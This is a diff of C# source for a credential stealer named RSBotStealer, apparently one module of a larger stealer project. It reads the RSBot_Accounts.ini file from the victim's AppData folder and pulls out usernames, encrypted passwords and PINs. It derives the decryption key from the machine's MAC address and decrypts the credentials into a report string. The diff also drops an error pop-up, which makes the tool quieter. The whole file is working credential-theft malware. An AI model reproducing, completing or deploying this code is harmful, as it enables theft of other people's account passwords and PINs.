@@ -1,20 +1,30 @@
-﻿using System;
+﻿#region Imports
+
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
+using System.Management;
 using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Windows.Forms;
 using sub.Util.Misc;
+
+#endregion
 
 namespace sub.Stealers
 {
     internal class RSBotStealer : IStealer
     {
+        private const string SettingsFileName = "RSBot_Accounts.ini";
         private string _name = "RSBotStealer";
+
+        private string _settingsFile = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
+
+        #region IStealer Members
 
         public string Name
         {
@@ -30,21 +40,11 @@ namespace sub.Stealers
             Data += "RSBot Account Stealer\r\n\r\n";
             foreach (RSBotAccount acc in accounts)
             {
-                Data += "Username: " + acc.UserName + " Password: " + acc.Password + " Pin: " + acc.Pin + "\r\n";
+                Data += "Username: " + acc.UserName + ", Password: " + acc.Password + ", Pin: " + acc.Pin + "\r\n";
             }
         }
 
-        private const string SettingsFileName = "RSBot_Accounts.ini";
-
-        private string _settingsFile = Path.Combine(
-            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
-
-        private const char Delimiter = 'a';
-        private string _passwordHashItem = "password";
-        private string _pinItem = "pin";
-        private string _rewardItem = "reward";
-        private string _takeBreaksItem = "take_breaks";
-        private string _memberItem = "member";
+        #endregion
 
         private IEnumerable<RSBotAccount> GetLocalAccounts(byte[] key)
         {
@@ -66,8 +66,8 @@ namespace sub.Stealers
             {
                 usernames.Add(m.Value);
             }
-            
-            Regex passpat = new Regex(@"(?<=password\=)[A-Za-z0-9_]{1,50}");
+
+            Regex passpat = new Regex(@"(?<=password\=)[a0-9-]{1,50}");
             MatchCollection passmatches = passpat.Matches(accountFileData);
             foreach (Match m in passmatches)
             {
@@ -79,118 +79,153 @@ namespace sub.Stealers
             {
                 int idx = usernames.IndexOf(user);
                 const string emp = "None";
-                try
+
+                string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
+                string pin = idx < pins.Count ? DecryptPassword(pins[idx].ToString(), key) : emp;
+                if (string.IsNullOrEmpty(pass) && pass != emp)
                 {
-                    string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
-                    string pin = idx < pins.Count ? DecryptPassword(pins[idx].ToString(), key) : emp;
-                    if (pass != emp)
-                    {
-                        pass = DecryptPassword(pass, key);
-                    }
-                    ret.Add(new RSBotAccount(user, pass, pin));
+                    pass = DecryptPassword(pass, key);
                 }
-                catch (Exception e)
-                {
-                    MessageBox.Show("Exception: " + e.Message);
-                }
+                ret.Add(new RSBotAccount(user, pass, pin));
             }
             return ret.ToArray();
         }
 
         private byte[] GetLocalKey()
         {
-            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
-            int lowestIndex = -1;
-            int lowestInterfaceIndex = -1;
-            for (int i = 0; i <= interfaces.Length - 1; i++)
+            NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
+            int num = -1;
+            int index = -1;
+            int num4 = allNetworkInterfaces.Length - 1;
+            for (int i = 0; i <= num4; i++)
             {
-                if (interfaces[i].OperationalStatus != OperationalStatus.Up)
+                if (allNetworkInterfaces[i].OperationalStatus == OperationalStatus.Up)
                 {
-                    continue;
+                    IPInterfaceProperties iPProperties = allNetworkInterfaces[i].GetIPProperties();
+                    if (iPProperties != null)
+                    {
+                        IPv4InterfaceProperties properties2 = iPProperties.GetIPv4Properties();
+                        if ((properties2 != null) && ((index < 0) || (properties2.Index < index)))
+                        {
+                            num = i;
+                            index = properties2.Index;
+                        }
+                    }
                 }
-
-                IPInterfaceProperties ipProperties = interfaces[i].GetIPProperties();
-                if (ipProperties == null) continue;
-
-                IPv4InterfaceProperties ipv4Properties = ipProperties.GetIPv4Properties();
-                if (ipv4Properties == null) continue;
-
-                if (lowestInterfaceIndex >= 0 && ipv4Properties.Index >= lowestInterfaceIndex) continue;
-                lowestIndex = i;
-                lowestInterfaceIndex = ipv4Properties.Index;
             }
-
-            byte[] key = ConvertByteEncoding(interfaces[lowestIndex].GetPhysicalAddress().GetAddressBytes());
-
-            return lowestIndex >= 0
-                       ? key
-                       : Encoding.Default.GetBytes(Environment.UserName +
-                                                   CultureInfo.CurrentCulture.TwoLetterISOLanguageName);
+            byte[] buffer2 = ConvertByteEncoding((byte[]) Mac(GetMACAddress()));
+            if (num >= 0)
+            {
+                return buffer2;
+            }
+            return Encoding.Default.GetBytes(Environment.UserName + CultureInfo.CurrentCulture.TwoLetterISOLanguageName);
         }
+
 
         private byte[] ConvertByteEncoding(byte[] key)
         {
-            byte[] ret = new byte[key.Length];
-            Array.Copy(key, ret, key.Length);
-
-            for (int i = 0; i <= ret.Length - 1; i++)
+            byte[] destinationArray = new byte[(key.Length - 1) + 1];
+            Array.Copy(key, destinationArray, key.Length);
+            int num2 = destinationArray.Length - 1;
+            for (int i = 0; i <= num2; i++)
             {
-                if (!IsValidIso88591(ret[i]))
+                if (!IsValidIso88591(destinationArray[i]))
                 {
-                    ret[i] = 63;
+                    destinationArray[i] = 0x3f;
                 }
             }
-
-            return ret;
+            return destinationArray;
         }
+
+        internal string GetMACAddress()
+        {
+            ManagementObjectCollection instances =
+                new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
+            string str2 = string.Empty;
+            foreach (ManagementObject obj2 in instances)
+            {
+                if (!str2.Equals(string.Empty)) continue;
+                if (Convert.ToBoolean(obj2["IPEnabled"]))
+                {
+                    str2 = obj2["MacAddress"].ToString().Replace(":", "");
+                }
+                obj2.Dispose();
+            }
+            return str2;
+        }
+
 
         private bool IsValidIso88591(byte value)
         {
-            return value <= 127 || value >= 160;
+            return (value <= 0x7f) || (value >= 160);
         }
 
-        private string DecryptPassword(string passwordHash, byte[] key)
+
+        public static object Mac(string ino)
         {
-            byte[] hashedKey;
-            using (SHA1 sha1 = SHA1.Create())
+            byte[] bytes =
+                BitConverter.GetBytes(long.Parse(ino, NumberStyles.HexNumber, CultureInfo.CurrentCulture.NumberFormat));
+            Array.Reverse(bytes);
+            byte[] buffer = new byte[6];
+            int index = 0;
+            do
             {
-                hashedKey = sha1.ComputeHash(key);
+                buffer[index] = bytes[index + 2];
+                index++;
+            } while (index <= 5);
+            return buffer;
+        }
+
+
+        private static sbyte ToSByte(byte b)
+        {
+            return (sbyte) b;
+        }
+
+
+        public static string DecryptPassword(string passwordHash, byte[] key)
+        {
+            byte[] array;
+            using (SHA1 sha = SHA1.Create())
+            {
+                array = sha.ComputeHash(key);
             }
+            sbyte[] numArray = Array.ConvertAll(array, ToSByte);
+            string[] strArray = passwordHash.Split(new char[] {'a'});
 
-            sbyte[] signedHashKey = Array.ConvertAll(hashedKey, Convert.ToSByte);
-            string[] splittedHash = passwordHash.Split(Delimiter);
-
-            byte[] password = new byte[splittedHash.Length];
-
-            int i = 0;
-            while (i < hashedKey.Length)
+            byte[] bytes = new byte[(strArray.Length - 1) + 1];
+            int index = 0;
+            while (index < array.Length)
             {
-                int val = Int32.Parse(splittedHash[i]);
-                sbyte sbVal = Convert.ToSByte(val);
-                if (sbVal == signedHashKey[i])
+                int result;
+                int.TryParse(strArray[index], out result);
+                sbyte num3 = (sbyte) result;
+                if (num3 == numArray[index])
                 {
                     break;
                 }
-
-                byte charVal = Convert.ToByte(sbVal - signedHashKey[i]);
-                password[i] = charVal;
-                i += 1;
+                bytes[index] = (byte) ((sbyte) (num3 - numArray[index]));
+                index++;
             }
-            return Encoding.Default.GetString(password, 0, i);
+            return Encoding.Default.GetString(bytes, 0, index);
         }
-    }
 
-    internal class RSBotAccount
-    {
-        public string UserName;
-        public string Password;
-        public string Pin;
+        #region Nested type: RSBotAccount
 
-        public RSBotAccount(string user, string pass, string pin)
+        internal class RSBotAccount
         {
-            UserName = user;
-            Password = pass;
-            Pin = pin;
+            public string Password;
+            public string Pin;
+            public string UserName;
+
+            public RSBotAccount(string user, string pass, string pin)
+            {
+                UserName = user;
+                Password = pass;
+                Pin = pin;
+            }
         }
+
+        #endregion
     }
 }
